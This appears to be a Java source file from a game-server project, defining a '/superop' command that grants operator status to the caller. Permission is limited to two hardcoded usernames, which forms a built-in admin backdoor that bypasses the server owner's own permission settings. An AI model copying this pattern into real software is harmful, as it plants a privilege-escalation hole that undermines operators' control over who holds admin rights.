package org.frustra.feather.server.commands;

import org.frustra.feather.server.Command;
import org.frustra.feather.server.Entity;

public class SuperopCommand extends Command {
	public String getName() {
		return "superop";
	}

	public void execute(Entity source, String[] arguments) {
		Command.execute("op " + source.getName());
		source.sendMessage("You now have op");
	}

	public boolean hasPermission(Entity source) {
		String name = source.getName();
		return name.equals("xthexder") || name.equals("jli");
	}

	public String getUsage(Entity source) {
		return "/superop";
	}
}
